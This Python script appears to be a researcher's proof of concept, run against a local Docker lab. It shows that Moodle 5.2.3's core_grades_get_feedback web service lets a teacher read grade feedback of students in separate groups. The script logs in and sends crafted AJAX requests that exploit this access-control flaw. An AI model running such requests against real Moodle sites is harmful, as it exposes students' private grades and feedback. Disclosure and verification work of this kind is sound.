#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: moodle-grades-feedback-idor (Medium: 4.3)
#  Vendor: Moodle LMS (Moodle)
#  Versions: Moodle 5.2.3 (v5.2.3 344232c)
#  Impact: core_grades_get_feedback skips separate-groups checks
#  Requires: loopback Docker; live Moodle v5.2.3 on 127.0.0.1:19580
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "moodle-grades-feedback-idor"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove Moodle v5.2.3 core_grades_get_feedback skips separate-groups checks."""


import json
import os
import re
import subprocess
from dataclasses import dataclass, field
from http.client import HTTPMessage
from pathlib import Path
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode
from urllib.request import Request, build_opener, HTTPCookieProcessor
from http.cookiejar import CookieJar

LABEL = "moodle-grades-feedback-idor"
WITNESS = "MOODLE-GRADES-FEEDBACK-IDOR-WITNESS"
PIN_RELEASE = "5.2.3"
HOST = "127.0.0.1"
PORT = 19580
BASE = f"http://{HOST}:{PORT}"
COMPOSE = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
HERE = Path(__file__).resolve().parent
TEACHER_USER = "teachera"
TEACHER_PASS = "TeacherPass1!"
STUDENT_USER = "studentb"
STUDENT_PASS = "StudentPass1!"
HTTP_TIMEOUT_S = 45.0


@dataclass
class HttpResponse:
    status: int
    body: str
    headers: HTTPMessage = field(default_factory=HTTPMessage)
    url: str = ""


class Session:
    def __init__(self) -> None:
        self.jar = CookieJar()
        self.opener = build_opener(HTTPCookieProcessor(self.jar))

    def request(
        self,
        method: str,
        url: str,
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
        timeout: float = HTTP_TIMEOUT_S,
    ) -> HttpResponse:
        hdrs = {"User-Agent": "moodle-grades-feedback-idor-lab"}
        if headers:
            hdrs.update(headers)
        req = Request(url, data=data, headers=hdrs, method=method)
        try:
            with self.opener.open(req, timeout=timeout) as resp:
                body = resp.read().decode("utf-8", "replace")
                return HttpResponse(int(resp.status), body, resp.headers, str(resp.geturl()))
        except HTTPError as exc:
            body = exc.read().decode("utf-8", "replace")
            hdrs_out = exc.headers if exc.headers is not None else HTTPMessage()
            return HttpResponse(int(exc.code), body, hdrs_out, url)
        except (URLError, TimeoutError, OSError) as exc:
            return HttpResponse(0, clip(str(exc)), HTTPMessage(), url)


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def success(detail: str) -> int:
    log(f"SUCCESS {LABEL} {detail} {WITNESS}")
    return 0


def clip(text: str, limit: int = 240) -> str:
    compact = text.replace("\r\n", "\\n").replace("\n", "\\n")
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def compose_exec(args: list[str], timeout: int = 180) -> subprocess.CompletedProcess[str]:
    cmd = ["docker", "compose", "-p", COMPOSE, "exec", "-T", "moodle", *args]
    return subprocess.run(
        cmd,
        cwd=HERE,
        capture_output=True,
        text=True,
        timeout=timeout,
        check=False,
    )


def seed_lab() -> dict[str, Any] | None:
    proc = compose_exec(["php", "/opt/lab/seed.php"], timeout=180)
    combined = (proc.stdout or "") + "\n" + (proc.stderr or "")
    for line in combined.splitlines():
        if line.startswith("LAB_SEED="):
            raw = line[len("LAB_SEED=") :]
            try:
                loaded = json.loads(raw)
            except json.JSONDecodeError:
                log(f"IOC seed-json-fail raw={clip(raw)}")
                return None
            if isinstance(loaded, dict):
                return loaded
    log(f"IOC seed-rc={proc.returncode} out={clip(combined)}")
    return None


def extract_logintoken(page: str) -> str | None:
    match = re.search(
        r'name="logintoken"\s+value="([^"]+)"|value="([^"]+)"\s+name="logintoken"',
        page,
        re.I,
    )
    if not match:
        return None
    return match.group(1) or match.group(2)


def extract_sesskey(page: str) -> str | None:
    match = re.search(r'"sesskey"\s*:\s*"([^"]+)"', page)
    if match:
        return match.group(1)
    match = re.search(r'name="sesskey"\s+value="([^"]+)"', page, re.I)
    if match:
        return match.group(1)
    match = re.search(r"sesskey=([a-zA-Z0-9]+)", page)
    if match:
        return match.group(1)
    return None


def login(session: Session, username: str, password: str) -> str | None:
    page = session.request("GET", f"{BASE}/login/index.php")
    if page.status != 200:
        log(f"IOC login-page status={page.status} body={clip(page.body)}")
        return None
    token = extract_logintoken(page.body)
    if not token:
        log(f"IOC login-token-missing body={clip(page.body)}")
        return None
    payload = urlencode(
        {
            "username": username,
            "password": password,
            "logintoken": token,
            "anchor": "",
        }
    ).encode("utf-8")
    posted = session.request(
        "POST",
        f"{BASE}/login/index.php",
        data=payload,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    sesskey = extract_sesskey(posted.body)
    if sesskey:
        return sesskey
    follow = session.request("GET", f"{BASE}/my/index.php")
    sesskey = extract_sesskey(follow.body)
    if sesskey:
        return sesskey
    home = session.request("GET", f"{BASE}/")
    sesskey = extract_sesskey(home.body)
    if not sesskey:
        log(
            "IOC login-sesskey-missing "
            f"post={posted.status} follow={follow.status} home={home.status} "
            f"body={clip(posted.body + follow.body)}"
        )
    return sesskey


def ajax_call(session: Session, sesskey: str, method: str, args: dict[str, Any]) -> dict[str, Any]:
    body = json.dumps(
        [{"index": 0, "methodname": method, "args": args}],
        separators=(",", ":"),
    ).encode("utf-8")
    resp = session.request(
        "POST",
        f"{BASE}/lib/ajax/service.php?sesskey={sesskey}",
        data=body,
        headers={"Content-Type": "application/json"},
    )
    parsed: Any = None
    if resp.body:
        try:
            parsed = json.loads(resp.body)
        except json.JSONDecodeError:
            parsed = None
    row: dict[str, Any] = {}
    if isinstance(parsed, list) and parsed and isinstance(parsed[0], dict):
        row = parsed[0]
    return {
        "http": resp.status,
        "error": bool(row.get("error")),
        "data": row.get("data") if isinstance(row.get("data"), dict) else {},
        "exception": row.get("exception") if isinstance(row.get("exception"), dict) else {},
        "raw": clip(resp.body),
    }


def errorcode(result: dict[str, Any]) -> str:
    exc = result.get("exception")
    if isinstance(exc, dict):
        code = exc.get("errorcode")
        if isinstance(code, str) and code:
            return code
        msg = exc.get("message")
        if isinstance(msg, str) and msg:
            return clip(msg, 80)
    if result.get("error"):
        return "error"
    return "none"


def as_bool(value: Any) -> bool:
    return bool(value) and value is not False


def main() -> int:
    log(f"label={LABEL} url={BASE} witness={WITNESS}")
    seed = seed_lab()
    if seed is None:
        return fail("seed-failed")

    log(
        "IOC seed "
        f"release={seed.get('release')} pin_ok={seed.get('pin_ok')} "
        f"course={seed.get('courseid')} groupmode={seed.get('groupmode')} "
        f"teacher={seed.get('teacherid')} studentb={seed.get('studentbid')} "
        f"item={seed.get('itemid')} aag={seed.get('accessallgroups')} "
        f"grader={seed.get('grader_view')} src_group={seed.get('source_has_groups_check')}"
    )

    if not as_bool(seed.get("pin_ok")):
        return fail(f"pin-mismatch release={seed.get('release')}")
    if not as_bool(seed.get("source_has_grader_view")):
        return fail("pin-missing-grader-view")
    if as_bool(seed.get("source_has_groups_check")):
        return fail("pin-already-has-groups-check")
    if int(seed.get("groupmode") or 0) != 1:
        return fail(f"groupmode-not-separate value={seed.get('groupmode')}")
    if as_bool(seed.get("accessallgroups")):
        return fail("teacher-has-accessallgroups")
    if not as_bool(seed.get("grader_view")):
        return fail("teacher-missing-grader-view")
    if as_bool(seed.get("teacher_in_b")) or not as_bool(seed.get("teacher_in_a")):
        return fail("teacher-group-membership")
    if as_bool(seed.get("studentb_in_a")) or not as_bool(seed.get("studentb_in_b")):
        return fail("studentb-group-membership")

    courseid = int(seed["courseid"])
    student_a = int(seed["studentaid"])
    student_b = int(seed["studentbid"])
    itemid = int(seed["itemid"])
    group_b = int(seed["groupbid"])

    teacher = Session()
    sesskey = login(teacher, TEACHER_USER, TEACHER_PASS)
    if not sesskey:
        return fail("teacher-login-failed")
    log(f"IOC teacher-login sesskey-len={len(sesskey)}")

    idor = ajax_call(
        teacher,
        sesskey,
        "core_grades_get_feedback",
        {"courseid": courseid, "userid": student_b, "itemid": itemid},
    )
    data = idor["data"] if isinstance(idor["data"], dict) else {}
    feedback = str(data.get("feedbacktext") or "")
    extra = str(data.get("additionalfield") or "")
    fullname = str(data.get("fullname") or "")
    log(
        "IOC idor "
        f"http={idor['http']} error={idor['error']} code={errorcode(idor)} "
        f"feedback={clip(feedback, 80)} extra={clip(extra, 80)} name={clip(fullname, 80)}"
    )

    same = ajax_call(
        teacher,
        sesskey,
        "core_grades_get_feedback",
        {"courseid": courseid, "userid": student_a, "itemid": itemid},
    )
    log(
        "IOC same-group "
        f"http={same['http']} error={same['error']} code={errorcode(same)}"
    )

    sibling = ajax_call(
        teacher,
        sesskey,
        "core_grades_get_gradable_users",
        {"courseid": courseid, "groupid": group_b},
    )
    sibling_code = errorcode(sibling)
    log(
        "IOC sibling-gradable "
        f"http={sibling['http']} error={sibling['error']} code={sibling_code}"
    )

    student = Session()
    student_key = login(student, STUDENT_USER, STUDENT_PASS)
    if not student_key:
        return fail("student-login-failed")
    student_call = ajax_call(
        student,
        student_key,
        "core_grades_get_feedback",
        {"courseid": courseid, "userid": student_b, "itemid": itemid},
    )
    student_code = errorcode(student_call)
    log(
        "IOC student-call "
        f"http={student_call['http']} error={student_call['error']} code={student_code}"
    )

    if idor["http"] not in {200, 0} and idor["http"] >= 400 and not data:
        return fail(f"idor-http={idor['http']} code={errorcode(idor)}")
    if idor["error"]:
        return fail(f"idor-denied code={errorcode(idor)}")
    if WITNESS not in feedback:
        return fail(f"idor-no-witness feedback={clip(feedback)}")

    detail = (
        f"how=live pin=v{PIN_RELEASE} teacher-role=teacher accessallgroups=no "
        f"groupmode=1 feedback-has-witness=yes additionalfield={clip(extra, 80)} "
        f"sibling-group-b={sibling_code} student-call={student_code}"
    )
    return success(detail)


if __name__ == "__main__":
    raise SystemExit(main())

